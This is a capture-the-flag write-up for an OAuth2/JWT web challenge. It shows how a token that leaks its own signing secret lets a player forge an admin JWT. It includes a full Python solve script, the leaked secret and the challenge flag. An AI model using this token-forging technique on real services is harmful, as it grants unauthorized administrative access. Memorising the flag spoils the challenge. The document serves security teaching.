After access to the website, we will see:

```html
<h1>Welcome to our SINGLE SIGN ON PAGE WITH FULL OAUTH2.0!</h1>
<a href="/protected">.</a>
<!--
Wish we had an automatic GET route for /authorize... well they'll just have to POST from their own clients I guess
POST /oauth2/token 
POST /oauth2/authorize
--!>
```

Seems we need use oauth to login and access ``/protected``. After try with oauth standard, we will get a token like ``eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoidXNlciIsInNlY3JldCI6InVmb3VuZG1lISIsImlhdCI6MTUzNjk3MzkwOSwiZXhwIjoxNTM2OTc0NTA5fQ.qfEHpLa78Cp-jNoJ-2xp8_4qnj9TDeqlKllLWWW3o-Q``.

But with this token, we will get a response like ``Unauthorized``.

Try decode this token:

```json
{
  "type": "user",
  "secret": "ufoundme!",
  "iat": 1536973909,
  "exp": 1536974509
}
```

looks like jwt secret is ``ufoundme!``, so just make a new token which type is ``admin`` and access ``/protected``, we wiil get flag: ``flag{JsonWebTokensaretheeasieststorage-lessdataoptiononthemarket!theyrelyonsupersecureblockchainlevelencryptionfortheirmethods}``.

Finally, my payload is here:

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import jwt
import time
import json
# https://github.com/LyleMi/Saker
from saker.main import Saker


class Cli(Saker):

    def __init__(self, url):
        super(Cli, self).__init__(url)

    def authorize(self, cid):
        data = {
            "response_type": "code",
            "client_id": cid,
            "redirect_uri": "token",
            "state": "ok"
        }
        self.post("oauth2/authorize", data=data)
        return self.lastr.url

    def token(self, cid, code):
        data = {
            "code": code,
            "grant_type": "authorization_code",
            "client_id": cid,
            "redirect_uri": "token",
            "state": "ok"
        }
        self.post("oauth2/token", data=data)
        return self.lastr.content

    def protected(self, token):
        headers = {
            "Authorization": "Bearer " + token,
        }
        self.get("protected", headers=headers)
        print(self.lastr.content)


if __name__ == '__main__':
    url = "http://web.chal.csaw.io:9000/"  # site url
    c = Cli(url)
    cid = "admin"
    step = sys.argv[1]
    if step == "1":
        code = c.authorize(cid).split("code=")[1].split("&")[0]
        print(code.split(".")[1].decode("base64"))
        token = json.loads(c.token(cid, code))["token"]
        payload = token.split(".")[1]
        payload = payload + '=' * (4 - len(payload) % 4)
        print(payload.decode("base64"))
    elif step == "2":
        key = "ufoundme!"
        payload = {
            "type": "admin",
            "secret": "ufoundme!",
            "iat": int(time.time()),
            "exp": int(time.time()) + 600
        }
        token = jwt.encode(payload, key)
        c.protected(token)
```
